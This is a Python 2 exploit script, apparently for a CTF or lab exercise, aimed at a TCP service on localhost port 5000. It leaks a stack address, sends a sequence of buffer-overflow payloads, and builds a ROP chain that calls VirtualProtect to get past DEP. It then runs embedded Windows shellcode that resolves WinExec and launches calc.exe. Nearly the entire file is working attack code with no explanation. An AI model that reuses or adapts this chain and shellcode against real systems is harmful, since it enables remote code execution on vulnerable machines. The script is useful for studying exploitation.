import socket
import struct
import time

def p(x):
	return struct.pack('<L', x)

host = "127.0.0.1"
port = 5000
shell = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x40\x1c\x8b\x04\x08\x8b\x04\x08\x8b\x58\x08\x8b\x53\x3c\x01\xda\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x49\x8b\x72\x24\x01\xde\x66\x8b\x0c\x4e\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x89\xd6\x31\xc9\x51\x68\x45\x78\x65\x63\x68\x41\x57\x69\x6e\x89\xe1\x8d\x49\x01\x51\x53\xff\xd6\x87\xfa\x89\xc7\x31\xc9\x51\x68\x72\x65\x61\x64\x68\x69\x74\x54\x68\x68\x41\x41\x45\x78\x89\xe1\x8d\x49\x02\x51\x53\xff\xd6\x89\xc6\x31\xc9\x51\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe1\x6a\x01\x51\xff\xd7\x31\xc9\x51\xff\xd6"

addr_virtualprotect = 0x7c37a140
jmp_eax = 0x7c3415a2 
pop_eax = 0x7c344cc1
pop_4	= 0x7c3410c0
addr_shell = 0x00186002
size = 0x02020202
NewProtect = 0x00000040
oldProtect = 0x0018fd80
push_esp = 0x7c345c30
temp = 0x00403374


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
time.sleep(0.5)

payloadx = '4444' + 'a'*31 + '\x00\x00\x00\x00\x00'

s.send(payloadx)
x = s.recv(1024)
b =  x.encode('hex')[68:70]
print 'addr_stack = 0x00' + b + '6000'

payload = '4444QUIT' + 'a'*32
payload += struct.pack('<I', pop_eax) 
payload += struct.pack('<I', addr_virtualprotect) 
payload += struct.pack('<I', jmp_eax)
payload += struct.pack('<I', push_esp)		#0x00
payload += '\x00'

payload2 = '4444AAAA' + 'a'*48
payload2 += '\x01' + '\x60' + b.decode('hex') 

payload3 = '4444AAAA' + 'a'*48
payload3 += '\x01\x01\x01\x00'

#0x00126000 = \x00\x60\x12\x00

payload4 = '4444AAAA' + 'a'*52
payload4 += '\x00'

payload5 = '4444AAAA' + 'a'*52
payload5 += '\x01\xa0\x00'

payload6 = '4444AAAA' + 'a'*52
payload6 += '\x01\x01\x01\x00'

#0x0000a000 = \x00\xa0\x00\x00

payload7 = '4444AAAA' + 'a'*56
payload7 += '\x40\x00'

payload8 = '4444AAAA' + 'a'*56
payload8 += '\x40\x01\x00'

payload9 = '4444AAAA' + 'a'*56
payload9 += '\x40\x01\x01\x00'

payload1 = '4444AAAA' + 'a'*60
payload1 += struct.pack('<I', temp)

payload0 = '4444AAAA' + 'a'*64
payload0 += shell




print 'sending payload'
s.send(payload0)
time.sleep(0.5)
s.send(payload1)
time.sleep(0.5)
s.send(payload9)
time.sleep(0.5)
s.send(payload8)
time.sleep(0.5)
s.send(payload7)
time.sleep(0.5)
s.send(payload6)
time.sleep(0.5)
s.send(payload5)
time.sleep(0.5)
s.send(payload4)
time.sleep(0.5)
s.send(payload3)
time.sleep(0.5)
s.send(payload2)
time.sleep(0.5)
s.send(payload)
print 'done'
raw_input()

#19fd70
#\x70\xfd\x19\x00
#0018ff44
#00186000
#00190000